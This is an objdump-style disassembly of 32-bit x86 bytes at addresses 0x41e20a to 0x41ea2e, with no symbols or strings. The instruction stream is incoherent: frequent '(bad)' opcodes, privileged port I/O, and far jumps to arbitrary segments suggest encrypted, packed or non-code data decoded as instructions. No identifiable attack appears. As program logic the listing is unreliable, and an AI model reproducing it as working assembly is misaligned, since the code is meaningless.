  41e20a:	push   0x9bb7be25
  41e20f:	pop    ebp
  41e210:	aas    
  41e211:	jne    0x41e1f0
  41e213:	popa   
  41e214:	pop    esi
  41e215:	pop    ds
  41e216:	loopne 0x41e203
  41e218:	or     bh,dl
  41e21a:	add    al,0x29
  41e21c:	fsubrp st(3),st
  41e21e:	leave  
  41e21f:	adc    al,0x4
  41e221:	push   esp
  41e222:	loop   0x41e1a6
  41e224:	mov    eax,0xc414ed10
  41e229:	out    0x56,eax
  41e22b:	push   0x3e3d1f45
  41e230:	outs   dx,DWORD PTR ds:[esi]
  41e231:	lahf   
  41e232:	lods   al,BYTE PTR ds:[esi]
  41e233:	sub    DWORD PTR [ecx+ebp*1],edx
  41e236:	mov    eax,0xee668ed6
  41e23b:	fnstsw WORD PTR [esi]
  41e23d:	fs or  al,0xb1
  41e240:	xchg   esp,eax
  41e241:	and    BYTE PTR [edi],bl
  41e243:	pop    edx
  41e244:	pushf  
  41e245:	call   0x407d:0x3a9cdf89
  41e24c:	cmc    
  41e24d:	arpl   WORD PTR ds:0x825296d1,cx
  41e253:	out    dx,eax
  41e254:	loopne 0x41e2c1
  41e256:	or     BYTE PTR [edx],0x19
  41e259:	inc    ebp
  41e25a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e25b:	xchg   edi,eax
  41e25c:	loope  0x41e1ef
  41e25e:	imul   edx,DWORD PTR [edx],0x5f2dd2cc
  41e264:	push   ebp
  41e265:	gs mov ecx,0xb8f64240
  41e26b:	adc    DWORD PTR [ecx-0x7182716d],esp
  41e271:	xchg   ecx,eax
  41e272:	or     eax,0xdaa1e86b
  41e277:	jle    0x41e2e0
  41e279:	es push es
  41e27b:	adc    eax,0x22fedbd9
  41e280:	xlat   BYTE PTR ds:[ebx]
  41e281:	pop    edx
  41e282:	inc    esi
  41e283:	xchg   BYTE PTR [edx],dl
  41e285:	rcl    DWORD PTR [edi-0x42],0x63
  41e289:	cmp    BYTE PTR [edi+0x198253af],0xa2
  41e290:	pop    edx
  41e291:	xchg   BYTE PTR [ecx],cl
  41e293:	jne    0x41e22b
  41e295:	mov    edx,0xceb8d417
  41e29a:	pop    esi
  41e29b:	jge    0x41e226
  41e29d:	xor    BYTE PTR [esi-0x5823414c],al
  41e2a3:	sar    ebx,cl
  41e2a5:	rep stos DWORD PTR es:[edi],eax
  41e2a7:	bswap  esp
  41e2a9:	add    dl,0x7
  41e2ac:	outs   dx,DWORD PTR ds:[esi]
  41e2ad:	xchg   ecx,eax
  41e2ae:	jmp    0xd7c389b8
  41e2b3:	pop    eax
  41e2b4:	pop    ss
  41e2b5:	cli    
  41e2b6:	jnp    0x41e30f
  41e2b8:	sub    eax,0xc6816403
  41e2bd:	sub    ecx,ebx
  41e2bf:	fcmovu st,st(7)
  41e2c1:	sbb    ecx,0xe50534e6
  41e2c7:	push   edx
  41e2c8:	mov    bh,0x25
  41e2ca:	(bad)  
  41e2cb:	imul   ecx,DWORD PTR [edx-0x682f3b8d],0x71d0579
  41e2d5:	sbb    BYTE PTR [ebx],dh
  41e2d7:	pop    ebp
  41e2d8:	clc    
  41e2d9:	lods   eax,DWORD PTR ds:[esi]
  41e2da:	sbb    eax,0x1d19c076
  41e2df:	fsub   DWORD PTR es:[esi-0x16]
  41e2e3:	lods   al,BYTE PTR ds:[esi]
  41e2e4:	mov    ds:0x6d53bdd6,al
  41e2e9:	(bad)  
  41e2ea:	cs mov eax,0x321146e8
  41e2f0:	jge    0x41e326
  41e2f2:	in     al,0x8
  41e2f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e2f5:	add    BYTE PTR [esi-0x5c3fce03],cl
  41e2fb:	mov    edi,ecx
  41e2fd:	mov    al,ds:0x2a5570d
  41e302:	loop   0x41e32d
  41e304:	jmp    0x54c09ae8
  41e309:	lods   al,BYTE PTR ds:[esi]
  41e30a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e30b:	or     eax,0x89adfde5
  41e310:	mov    ecx,0xb5f63528
  41e315:	popf   
  41e316:	sar    BYTE PTR [edx+0x206685ce],cl
  41e31c:	cld    
  41e31d:	pop    eax
  41e31e:	push   esi
  41e31f:	nop
  41e320:	xchg   ecx,eax
  41e321:	mov    esp,0xe4de13fc
  41e326:	jmp    0x41e2fa
  41e328:	xor    ebx,ebp
  41e32a:	cdq    
  41e32b:	inc    esi
  41e32c:	cwde   
  41e32d:	pop    esp
  41e32e:	(bad)  
  41e32f:	mov    edi,0xed9f1254
  41e334:	add    BYTE PTR [eax],0xc2
  41e337:	repnz or ah,BYTE PTR [ebp-0x199eae19]
  41e33e:	mov    edx,0x8d9f7ca9
  41e343:	add    ebp,eax
  41e345:	enter  0x4ec7,0x53
  41e349:	or     al,BYTE PTR [edi-0x71]
  41e34c:	jns    0x41e2d2
  41e34e:	push   esp
  41e34f:	ret    
  41e350:	aad    0x28
  41e352:	push   ecx
  41e353:	mov    ebp,0xe60aa8be
  41e358:	ja     0x41e2e7
  41e35a:	sbb    eax,0xc0cc77b9
  41e35f:	xlat   BYTE PTR ds:[ebx]
  41e360:	xor    DWORD PTR [edx],ebp
  41e362:	add    al,0x95
  41e364:	fbld   TBYTE PTR [edx-0x1c1590d0]
  41e36a:	add    eax,0xd2c8194b
  41e36f:	cmc    
  41e370:	adc    DWORD PTR [edi-0x3d74f449],ebx
  41e376:	ins    DWORD PTR es:[edi],dx
  41e377:	fisttp QWORD PTR [ebp+ebp*1+0x19552c5c]
  41e37e:	mov    ds:0x56cfa0ea,al
  41e383:	jl     0x41e314
  41e385:	jb     0x41e340
  41e387:	loopne 0x41e36b
  41e389:	jae    0x41e368
  41e38b:	cwde   
  41e38c:	push   ecx
  41e38d:	out    dx,al
  41e38e:	cwde   
  41e38f:	data16 fcom QWORD PTR [ecx]
  41e392:	inc    eax
  41e393:	xchg   ecx,edx
  41e395:	mov    ch,0xd9
  41e397:	daa    
  41e398:	adc    esp,DWORD PTR [edi-0x37]
  41e39b:	(bad)  
  41e39c:	imul   edi,ebp,0x53
  41e39f:	in     al,dx
  41e3a0:	test   eax,0xfcd52dc5
  41e3a5:	sbb    al,0x16
  41e3a7:	inc    ecx
  41e3a8:	mov    esp,0xc771af1d
  41e3ad:	sub    ah,ch
  41e3af:	mov    al,ds:0x48c736aa
  41e3b4:	ins    BYTE PTR es:[edi],dx
  41e3b5:	mov    DWORD PTR [ecx+esi*2-0x3],0x35b316e7
  41e3bd:	fldenv [eax]
  41e3bf:	adc    dh,ch
  41e3c1:	pop    ecx
  41e3c2:	rcl    dh,cl
  41e3c4:	out    0x27,eax
  41e3c6:	inc    ebp
  41e3c7:	or     BYTE PTR [ecx+0x52a11aec],0x7
  41e3ce:	xchg   esi,eax
  41e3cf:	stc    
  41e3d0:	xlat   BYTE PTR ds:[ebx]
  41e3d1:	pop    ds
  41e3d2:	fidiv  DWORD PTR [esi-0x13045ab0]
  41e3d8:	pop    ss
  41e3d9:	fdivr  QWORD PTR [ebp+0x651b0d69]
  41e3df:	cmp    edx,DWORD PTR [edi]
  41e3e1:	adc    bl,BYTE PTR [ecx+0xc]
  41e3e4:	retf   
  41e3e5:	cmp    BYTE PTR [edx-0x42],al
  41e3e8:	sbb    bl,ch
  41e3ea:	xchg   ebp,eax
  41e3eb:	test   eax,0x4ed8bec
  41e3f0:	popa   
  41e3f1:	pop    ds
  41e3f2:	out    dx,eax
  41e3f3:	jnp    0x41e44c
  41e3f5:	sbb    eax,DWORD PTR [ebp-0x256b105f]
  41e3fb:	enter  0xb8c5,0xaf
  41e3ff:	push   ds
  41e400:	in     eax,dx
  41e401:	pop    ecx
  41e402:	rep lods eax,DWORD PTR ds:[esi]
  41e404:	cmp    al,0x32
  41e406:	and    bl,cl
  41e408:	sub    DWORD PTR [ecx],ebp
  41e40a:	fs pop ecx
  41e40c:	mov    ebx,0x8619e2f1
  41e411:	push   edx
  41e412:	jmp    0x2cbd:0x102e106d
  41e419:	pop    esp
  41e41a:	rcl    ch,0x84
  41e41d:	in     eax,0xaa
  41e41f:	imul   ebp,DWORD PTR [ebx+0x52],0xffffffcb
  41e423:	ja     0x41e485
  41e425:	in     eax,0x9e
  41e427:	cwde   
  41e428:	cmp    al,0x84
  41e42a:	mov    esi,0xc12df388
  41e42f:	push   ecx
  41e430:	jb     0x41e3bf
  41e432:	mov    esi,0x57ad48a8
  41e437:	add    eax,0xd81197de
  41e43c:	out    0xf6,eax
  41e43e:	adc    eax,0xc15933ea
  41e443:	test   al,0x5d
  41e445:	imul   esi,DWORD PTR ds:0xa6baaaf3,0xffffffc5
  41e44c:	dec    eax
  41e44d:	jns    0x41e4b9
  41e44f:	jg     0x41e3f8
  41e451:	imul   edi,eax,0x50
  41e454:	or     ecx,DWORD PTR [edi+0x5f]
  41e457:	je     0x41e467
  41e459:	jge    0x41e3dc
  41e45b:	sub    BYTE PTR [edx+0x71],ah
  41e45e:	dec    esp
  41e45f:	inc    ecx
  41e460:	push   ss
  41e461:	inc    edx
  41e462:	(bad)  
  41e463:	sbb    eax,0xaf3c602d
  41e468:	xor    edi,DWORD PTR [edi]
  41e46a:	sub    ebp,DWORD PTR [esi-0x3e4c827b]
  41e470:	ret    0x7c0a
  41e473:	mov    cl,0x12
  41e475:	jl     0xacf3c8e8
  41e47b:	pslld  mm1,mm7
  41e47e:	mov    eax,ds:0xe65213f
  41e483:	and    bh,BYTE PTR [edi]
  41e485:	in     al,dx
  41e486:	mov    ebx,esi
  41e488:	dec    edi
  41e489:	imul   esp,DWORD PTR [esi+0x14300754],0x9d9e74a1
  41e493:	cld    
  41e494:	popa   
	...
  41e511:	add    BYTE PTR [eax],al
  41e513:	add    BYTE PTR [ecx-0x2],al
  41e516:	test   BYTE PTR [ebx],ah
  41e518:	mov    edi,0x51fee77b
  41e51d:	jecxz  0x41e544
  41e51f:	arpl   WORD PTR [edx-0x48295ea2],di
  41e525:	jg     0x41e528
  41e527:	add    BYTE PTR [ecx+0x7],ch
  41e52a:	add    BYTE PTR [eax],al
  41e52c:	and    eax,0x861cc96c
  41e531:	aam    0xd3
  41e533:	cmp    DWORD PTR [ebx-0x79f99bb1],eax
  41e539:	pop    eax
  41e53a:	sub    eax,esi
  41e53c:	push   edx
  41e53d:	adc    al,0x34
  41e53f:	mov    DWORD PTR [eax+0xe],edx
  41e542:	cmp    al,0x3b
  41e544:	pop    es
  41e545:	imul   eax,esi,0xbe6de5de
  41e54b:	sub    eax,0x6950134e
  41e550:	nop
  41e551:	fwait
  41e552:	test   al,0x27
  41e554:	sub    eax,DWORD PTR [eax-0x568f1b62]
  41e55a:	inc    esi
  41e55b:	mov    ch,0xd3
  41e55d:	mov    al,ds:0xd295c48f
  41e562:	stc    
  41e563:	sub    DWORD PTR [ecx],edi
  41e565:	and    al,0xfb
  41e567:	fcomp  QWORD PTR [ecx-0x6c]
  41e56a:	cwde   
  41e56b:	push   es
  41e56c:	jmp    edi
  41e56e:	mov    ebp,0xa67b1268
  41e573:	mov    al,0x7e
  41e575:	sbb    cl,0x1c
  41e578:	jo     0x41e5a5
  41e57a:	jae    0x41e546
  41e57c:	inc    ebx
  41e57d:	mov    cl,0x1f
  41e57f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e580:	xchg   ebp,eax
  41e581:	jp     0x41e5ee
  41e583:	pop    esp
  41e584:	adc    al,0x2
  41e586:	rcl    DWORD PTR [edi+0x1e4f32ae],0xbd
  41e58d:	mov    cl,0xa7
  41e58f:	sbb    al,0x4f
  41e591:	cld    
  41e592:	mov    eax,0xfcf27ace
  41e597:	aaa    
  41e598:	in     al,0xc4
  41e59a:	cmp    DWORD PTR [edx],ecx
  41e59c:	and    al,0xb8
  41e59e:	jmp    0x7db3:0xc4c8b6b8
  41e5a5:	adc    ebx,DWORD PTR ds:0x8794acc1
  41e5ab:	jae    0x41e5e8
  41e5ad:	sbb    eax,0xcede34f9
  41e5b2:	test   al,0xb
  41e5b4:	clc    
  41e5b5:	stos   DWORD PTR es:[edi],eax
  41e5b6:	fwait
  41e5b7:	aaa    
  41e5b8:	popa   
  41e5b9:	out    0x3e,eax
  41e5bb:	test   eax,0x83e8683d
  41e5c0:	or     DWORD PTR [edi],0xffffffaf
  41e5c3:	push   0xffffffe7
  41e5c5:	daa    
  41e5c6:	lods   al,BYTE PTR ds:[esi]
  41e5c7:	daa    
  41e5c8:	repnz dec eax
  41e5ca:	inc    edi
  41e5cb:	inc    ebx
  41e5cc:	sub    DWORD PTR [edi+0x9],eax
  41e5cf:	cmp    ebp,DWORD PTR [edi-0x10670169]
  41e5d5:	pop    ds
  41e5d6:	xor    edx,DWORD PTR [ebp-0x3fae0383]
  41e5dc:	or     eax,0x54f0daff
  41e5e1:	xchg   ah,bl
  41e5e3:	sub    BYTE PTR [ebp+0x31],bh
  41e5e6:	(bad)
  41e5e9:	mov    esp,0xe96bb909
  41e5ee:	into   
  41e5ef:	mov    dh,0x60
  41e5f1:	(bad)  
  41e5f2:	retf   0x9411
  41e5f5:	repnz icebp 
  41e5f7:	mov    ds:0x5142a7a6,eax
  41e5fc:	daa    
  41e5fd:	pusha  
  41e5fe:	in     al,0x55
  41e600:	shl    BYTE PTR [edi+edi*1],1
  41e603:	sbb    bl,BYTE PTR [edi]
  41e605:	repnz mov al,ds:0x2926190
  41e60b:	(bad)
  41e60e:	sbb    eax,0xee3d22b7
  41e613:	jl     0x41e5f7
  41e615:	mov    esi,0xe07448d2
  41e61a:	test   eax,0x114e8932
  41e61f:	cli    
  41e620:	mov    bh,0xd6
  41e622:	and    dh,BYTE PTR [edi-0x4e]
  41e625:	fcomp  QWORD PTR [ebp*8-0x606baad6]
  41e62c:	mov    esi,0x66b7230c
  41e631:	std    
  41e632:	test   DWORD PTR [edx],0xd3987bef
  41e638:	addr16 in al,0xbe
  41e63b:	test   eax,0x1f9f81b6
  41e640:	jl     0x41e68b
  41e642:	(bad)  
  41e643:	mov    dl,bh
  41e645:	and    ah,BYTE PTR [esi-0x1f]
  41e648:	pop    eax
  41e649:	pop    ds
  41e64a:	adc    DWORD PTR [edi-0x1388fe10],edx
  41e650:	cmp    DWORD PTR [esi+0x6cb15e39],esp
  41e656:	adc    ah,BYTE PTR [ebx+0x21eac1c0]
  41e65c:	dec    esp
  41e65d:	add    BYTE PTR [edi],bh
  41e65f:	mov    cl,0xe8
  41e661:	jns    0x41e6e1
  41e663:	addr16 stc 
  41e665:	pop    edi
  41e666:	fiadd  DWORD PTR [edx+0x7a1164e8]
  41e66c:	push   ecx
  41e66d:	cmpxchg DWORD PTR [edi+0x56],eax
  41e671:	mov    ebx,DWORD PTR [ebp+0x4d429e03]
  41e677:	or     esp,DWORD PTR [ebx-0x5d]
  41e67a:	lahf   
  41e67b:	sbb    DWORD PTR ds:0xce3c9a8,edx
  41e681:	fwait
  41e682:	(bad)  
  41e683:	push   ss
  41e684:	jg     0x41e66e
  41e686:	out    dx,eax
  41e687:	sbb    BYTE PTR [ebx+eax*1],ch
  41e68a:	mov    dl,0x78
  41e68c:	dec    esi
  41e68d:	adc    DWORD PTR ds:0x39fcf113,edi
  41e693:	dec    esi
  41e694:	fcom   DWORD PTR [edx+0x17f446e3]
  41e69a:	nop
  41e69b:	dec    eax
  41e69c:	stc    
  41e69d:	xchg   DWORD PTR [edx-0x47],esi
  41e6a0:	mov    bl,0x98
  41e6a2:	pop    es
  41e6a3:	fld    DWORD PTR [ebp+0x3521df72]
  41e6a9:	shr    al,cl
  41e6ab:	mov    edx,0x18cfb08a
  41e6b0:	out    0xf4,al
  41e6b2:	cs aam 0xa5
  41e6b5:	inc    eax
  41e6b6:	leave  
  41e6b7:	dec    esp
  41e6b8:	je     0x41e71c
  41e6ba:	xor    edx,DWORD PTR [ecx+0x336a50e8]
  41e6c0:	inc    edx
  41e6c1:	fwait
  41e6c2:	mov    esi,0x68f16c17
  41e6c7:	and    ecx,ebx
  41e6c9:	int    0x12
  41e6cb:	mov    esp,0x7562625e
  41e6d0:	xchg   esi,eax
  41e6d1:	dec    edi
  41e6d2:	jp     0x41e676
  41e6d4:	mov    ebp,0xd6894f2b
  41e6d9:	scas   eax,DWORD PTR es:[edi]
  41e6da:	xchg   ebx,eax
  41e6db:	outs   dx,DWORD PTR ds:[esi]
  41e6dc:	js     0x41e6e8
  41e6de:	ret    0x874a
  41e6e1:	lods   eax,DWORD PTR ds:[esi]
  41e6e2:	jae    0x41e66a
  41e6e4:	cmp    al,dl
  41e6e6:	test   DWORD PTR [eax+ebx*8-0x326bbc5c],ebx
  41e6ed:	xchg   ebx,eax
  41e6ee:	jmp    0xa39fd7
  41e6f3:	test   eax,0x5cd3b20d
  41e6f8:	test   al,0xa2
  41e6fa:	std    
  41e6fb:	test   BYTE PTR [edx+ebx*4-0x1f],0xc7
  41e700:	enter  0x3cdd,0x3b
  41e704:	add    bl,BYTE PTR [esi+eiz*8-0x6a]
  41e708:	push   eax
  41e709:	daa    
  41e70a:	add    bl,BYTE PTR [edx+0xcbe970d]
  41e710:	pop    ss
  41e711:	xor    ebx,DWORD PTR [edi-0x28]
  41e714:	lds    eax,FWORD PTR [edx+ebp*4-0x6f00b43a]
  41e71b:	xlat   BYTE PTR ds:[ebx]
  41e71c:	pop    ds
  41e71d:	ror    ch,cl
  41e71f:	fistp  DWORD PTR [esi]
  41e721:	in     eax,dx
  41e722:	mov    ch,0xed
  41e724:	enter  0x5871,0x4a
  41e728:	sub    BYTE PTR [ebx*2-0x4dcd75d3],dl
  41e72f:	fstp   DWORD PTR [ebx+0x4629efd4]
  41e735:	mov    ecx,0xe194ad03
  41e73a:	pushf  
  41e73b:	lods   eax,DWORD PTR ds:[esi]
  41e73c:	jo     0x41e72c
  41e73e:	iret   
  41e73f:	mov    BYTE PTR [edi-0x21],cl
  41e742:	xor    eax,0xf3eccc08
  41e747:	xchg   esp,eax
  41e748:	mov    dh,0x5c
  41e74a:	mov    eax,0x88c9e077
  41e74f:	cmp    ebp,esi
  41e751:	inc    ebp
  41e752:	aas    
  41e753:	push   es
  41e754:	mov    ds:0x20fcd65c,eax
  41e759:	push   eax
  41e75a:	push   ecx
  41e75b:	inc    edx
  41e75c:	push   edx
  41e75d:	in     eax,0x68
  41e75f:	imul   ebx,DWORD PTR [ebx+eiz*4],0x1daed755
  41e766:	shl    BYTE PTR [ecx+0x74],0xe5
  41e76a:	xor    eax,0xe3c49ce8
  41e76f:	dec    esi
  41e770:	mov    ah,0xb2
  41e772:	mov    ecx,0x67b78117
  41e777:	data16 je 0x41e7ac
  41e77a:	aaa    
  41e77b:	push   edx
  41e77c:	imul   ebx,DWORD PTR [edi],0xffffffa9
  41e77f:	mov    dh,0x5e
  41e781:	test   BYTE PTR [ebx],0x50
  41e784:	mov    edx,DWORD PTR [edx+0x1e79c27a]
  41e78a:	mov    edi,0x30c4830d
  41e78f:	sub    BYTE PTR [eax-0x6],bh
  41e792:	repz jg 0x41e7d0
  41e795:	mov    eax,DWORD PTR [edi]
  41e797:	jne    0x41e767
  41e799:	fisubr WORD PTR [esi+0x444679f7]
  41e79f:	mov    esp,0x80b4b555
  41e7a4:	pop    ds
  41e7a5:	ret    0x97c2
  41e7a8:	outs   dx,BYTE PTR ds:[esi]
  41e7a9:	out    dx,eax
  41e7aa:	daa    
  41e7ab:	loopne 0x41e788
  41e7ad:	mov    al,0xa1
  41e7af:	addr16 cld 
  41e7b1:	or     DWORD PTR [edi-0x875f3d1],edx
  41e7b7:	cmp    al,0xd6
  41e7b9:	mov    eax,ds:0x98767c8e
  41e7be:	js     0x41e7be
  41e7c0:	popa   
  41e7c1:	push   ebx
  41e7c2:	jl     0x41e7b3
  41e7c4:	fcom   QWORD PTR [edi+0x6759e206]
  41e7ca:	ja     0x41e7b6
  41e7cc:	cmc    
  41e7cd:	xor    BYTE PTR [ebx-0x6bc6adce],dl
  41e7d3:	outs   dx,DWORD PTR ds:[esi]
  41e7d4:	not    bh
  41e7d6:	icebp  
  41e7d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e7d8:	scas   al,BYTE PTR es:[edi]
  41e7d9:	retf   
  41e7da:	clc    
  41e7db:	aam    0xaa
  41e7dd:	push   ss
  41e7de:	cmp    eax,0x9c658fb9
  41e7e3:	and    al,0x78
  41e7e5:	out    0xfd,eax
  41e7e7:	adc    al,0xb2
  41e7e9:	popa   
  41e7ea:	gs out 0x98,al
  41e7ed:	xchg   edx,eax
  41e7ee:	push   esi
  41e7ef:	int3   
  41e7f0:	(bad)  
  41e7f1:	imul   edx,DWORD PTR [ebp+eiz*8+0x28],0xfc73c072
  41e7f9:	test   al,0x6e
  41e7fb:	dec    edi
  41e7fc:	mov    al,ds:0x9589a627
  41e801:	xchg   esi,eax
  41e802:	add    edi,esi
  41e804:	idiv   DWORD PTR [edi+eiz*1]
  41e807:	sahf   
  41e808:	outs   dx,DWORD PTR ds:[esi]
  41e809:	adc    al,BYTE PTR [eax-0x7363184b]
  41e80f:	call   0xa9af:0x410a2efc
  41e816:	add    al,0x14
  41e818:	fs test dh,bl
  41e81b:	or     dl,bh
  41e81d:	hlt    
  41e81e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e81f:	int3   
  41e820:	outs   dx,DWORD PTR ds:[esi]
  41e821:	jl     0x41e7b1
  41e823:	push   es
  41e824:	mov    ebx,0x8c36dec8
  41e829:	mov    ch,0xde
  41e82b:	lods   al,BYTE PTR ds:[esi]
  41e82c:	sub    eax,0xfefc3371
  41e831:	cmp    esi,DWORD PTR [ecx]
  41e833:	outs   dx,DWORD PTR ds:[esi]
  41e834:	push   eax
  41e835:	das    
  41e836:	mov    ds:0xd21d6734,al
  41e83b:	xor    DWORD PTR [ebx],esp
  41e83d:	cmp    ecx,ebp
  41e83f:	je     0x41e871
  41e841:	dec    esi
  41e842:	xlat   BYTE PTR es:[ebx]
  41e844:	fwait
  41e845:	pop    ecx
  41e846:	mov    bh,0x71
  41e848:	loop   0x41e84d
  41e84a:	imul   ebp,DWORD PTR [esp+ecx*8-0x69],0xffffff91
  41e84f:	inc    ebx
  41e850:	add    BYTE PTR [eax+0x6f0be4f5],ch
  41e856:	and    bl,ah
  41e858:	outs   dx,BYTE PTR ds:[esi]
  41e859:	or     ebx,DWORD PTR [esp+eax*4+0x2e44241f]
  41e860:	sub    DWORD PTR [edi+0x63f48c90],ebp
  41e866:	loopne 0x41e8d4
  41e868:	or     bl,bh
  41e86a:	sbb    DWORD PTR [esi-0x51],edx
  41e86d:	jno    0x41e8b8
  41e86f:	rcl    esp,0xf4
  41e872:	clc    
  41e873:	and    ebp,DWORD PTR ds:0x85e1ede9
  41e879:	pop    esp
  41e87a:	pop    ds
  41e87b:	dec    edx
  41e87c:	or     DWORD PTR [esi],0xffffff81
  41e87f:	out    dx,al
  41e880:	and    edi,eax
  41e882:	js     0x41e80d
  41e884:	ret    0x4f8f
  41e887:	loopne 0x41e816
  41e889:	or     al,0x2
  41e88b:	aas    
  41e88c:	fdivr  QWORD PTR [ecx-0x80]
  41e88f:	leave  
  41e890:	mov    ch,0xba
  41e892:	xor    DWORD PTR cs:[edi],edx
  41e895:	fcom   DWORD PTR [eax]
  41e897:	addr16 dec ebx
  41e899:	dec    ebp
  41e89a:	and    eax,0xce956a40
  41e89f:	or     dl,BYTE PTR [bp+di+0x60b6]
  41e8a4:	int3   
  41e8a5:	call   0xb270:0xec357568
  41e8ac:	je     0x41e92b
  41e8ae:	lds    ebp,FWORD PTR [ebp+0x19]
  41e8b1:	hlt    
  41e8b2:	adc    eax,DWORD PTR [eax-0x456b578d]
  41e8b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e8b9:	(bad)  [edx-0x235babde]
  41e8bf:	or     al,0xf8
  41e8c1:	mov    ah,0xf7
  41e8c3:	popa   
  41e8c4:	loop   0x41e866
  41e8c6:	pop    es
  41e8c7:	stos   DWORD PTR es:[edi],eax
  41e8c8:	mov    dh,0x43
  41e8ca:	xchg   ebx,eax
  41e8cb:	xchg   ebx,eax
  41e8cc:	push   edi
  41e8cd:	push   esp
  41e8ce:	jl     0x41e8d2
  41e8d0:	and    al,0x3a
  41e8d2:	data16 das 
  41e8d4:	mov    ebx,0x9c96a79b
  41e8d9:	je     0x41e8f7
  41e8db:	jmp    0x84c7:0x640f2831
  41e8e2:	jl     0x41e945
  41e8e4:	push   es
  41e8e5:	(bad)  
  41e8e6:	mov    BYTE PTR [ebx-0x12352310],0xac
  41e8ed:	xchg   esi,eax
  41e8ee:	inc    edx
  41e8ef:	cmp    DWORD PTR [ebp+0x59],ecx
  41e8f2:	repz xor DWORD PTR ds:0x7f6c5596,esp
  41e8f9:	push   0x96f4f749
  41e8fe:	add    edi,DWORD PTR [ecx+0x727fb03c]
  41e904:	sub    eax,0x85f1a798
  41e909:	xor    al,dh
  41e90b:	mov    esi,DWORD PTR [eax+0x5c]
  41e90e:	mov    al,0x98
  41e910:	mov    ebp,eax
  41e912:	and    eax,0xd8370244
  41e917:	pop    esp
  41e918:	jb     0x41e8d2
  41e91a:	test   DWORD PTR [ebp+ebp*2-0x19],esp
  41e91e:	and    esi,eax
  41e920:	std    
  41e921:	pop    ds
  41e922:	out    dx,al
  41e923:	sti    
  41e924:	mov    edx,ebp
  41e926:	dec    edx
  41e927:	mov    bh,0x53
  41e929:	ds jg  0x41e8af
  41e92c:	icebp  
  41e92d:	jl     0x41e93f
  41e92f:	mov    al,ds:0x96b3c4e9
  41e934:	push   cs
  41e935:	mov    dh,0xe0
  41e937:	cmp    DWORD PTR [ebx+0x5adfc843],edi
  41e93d:	inc    esp
  41e93e:	ins    BYTE PTR es:[edi],dx
  41e93f:	mov    bh,0xa
  41e941:	vpaddsb ymm0,ymm1,ymm7
  41e945:	fild   DWORD PTR [edi+0x443a4cec]
  41e94b:	call   0xac52:0xc4655ba0
  41e952:	sub    ebx,DWORD PTR [ebp+edi*1+0x569bdfb4]
  41e959:	cmp    ch,BYTE PTR ds:0x6ff73f95
  41e95f:	cmp    edi,eax
  41e961:	div    al
  41e963:	scas   eax,DWORD PTR es:[edi]
  41e964:	pop    esi
  41e965:	or     BYTE PTR [edi-0x27],0xcd
  41e969:	pop    ebx
  41e96a:	jle    0x41e93f
  41e96c:	idiv   dl
  41e96e:	pop    edi
  41e96f:	aad    0x3d
  41e971:	mov    esp,0x4ea8c030
  41e976:	or     DWORD PTR [eax-0x6434a6bd],ecx
  41e97c:	push   ebx
  41e97d:	mov    dl,0x6a
  41e97f:	fs cwde 
  41e981:	test   ecx,edx
  41e983:	add    eax,0x19f683e3
  41e988:	xchg   edi,eax
  41e989:	out    0xc5,eax
  41e98b:	xlat   BYTE PTR ds:[ebx]
  41e98c:	mov    ebp,0xeb95da21
  41e991:	test   eax,0xd6abf973
  41e996:	in     eax,0x42
  41e998:	aas    
  41e999:	mov    ah,0xde
  41e99b:	and    edi,DWORD PTR [edi-0x22d45901]
  41e9a1:	int3   
  41e9a2:	jge    0x41e997
  41e9a4:	sub    eax,0x5b0deb9a
  41e9a9:	sbb    edi,0xffffff83
  41e9ac:	pusha  
  41e9ad:	or     cl,BYTE PTR [eax-0x36d9681b]
  41e9b3:	cmp    al,0x8f
  41e9b5:	idiv   BYTE PTR [ebp+0x33]
  41e9b8:	scas   al,BYTE PTR es:[edi]
  41e9b9:	icebp  
  41e9ba:	stos   BYTE PTR es:[edi],al
  41e9bb:	pop    eax
  41e9bc:	es imul edx,edi,0xfffffff9
  41e9c0:	mov    al,ds:0x9b21d25f
  41e9c5:	fs jg  0x41ea3c
  41e9c8:	mov    ebx,ebp
  41e9ca:	mov    dh,0xeb
  41e9cc:	shl    DWORD PTR [edx],cl
  41e9ce:	outs   dx,BYTE PTR ds:[esi]
  41e9cf:	inc    ebx
  41e9d0:	je     0x41e9c0
  41e9d2:	sub    BYTE PTR [esi],ah
  41e9d4:	repz daa 
  41e9d6:	jge    0x41e96b
  41e9d8:	and    bh,cl
  41e9da:	push   esi
  41e9db:	fisub  DWORD PTR [edx+0x7e]
  41e9de:	mov    bh,0xbe
  41e9e0:	xchg   esp,eax
  41e9e1:	push   edx
  41e9e2:	cdq    
  41e9e3:	fidivr DWORD PTR [ebx]
  41e9e5:	into   
  41e9e6:	push   edi
  41e9e7:	add    al,BYTE PTR [ecx-0x46d9f08]
  41e9ed:	fabs   
  41e9ef:	pop    edx
  41e9f0:	cld    
  41e9f1:	stos   DWORD PTR es:[edi],eax
  41e9f2:	xor    ebp,DWORD PTR [esi-0x2396e734]
  41e9f8:	push   eax
  41e9f9:	ins    BYTE PTR es:[edi],dx
  41e9fa:	int    0x4c
  41e9fc:	daa    
  41e9fd:	jge    0x41ea49
  41e9ff:	into   
  41ea00:	das    
  41ea01:	shr    BYTE PTR [eax+esi*8+0x40],cl
  41ea05:	jns    0x41ea6a
  41ea07:	stos   BYTE PTR es:[edi],al
  41ea08:	cmp    al,0x8d
  41ea0a:	inc    esi
  41ea0b:	ret    0xa6cf
  41ea0e:	push   edx
  41ea0f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ea10:	sub    edx,DWORD PTR [ebp+0x1a]
  41ea13:	and    eax,0x7e25911f
  41ea18:	push   cs
  41ea19:	adc    al,0x96
  41ea1b:	dec    esi
  41ea1c:	pop    edx
  41ea1d:	stos   BYTE PTR es:[edi],al
  41ea1e:	pop    esi
  41ea1f:	ins    BYTE PTR es:[edi],dx
  41ea20:	xor    al,0xfb
  41ea22:	out    dx,al
  41ea23:	imul   ebp,DWORD PTR [esi-0x4f],0xffffffd3
  41ea27:	jg     0x41ea3e
  41ea29:	cdq    
  41ea2a:	adc    ecx,DWORD PTR [esi-0x4d]
  41ea2d:	in     eax,dx
  41ea2e:	jae    0x41ea83
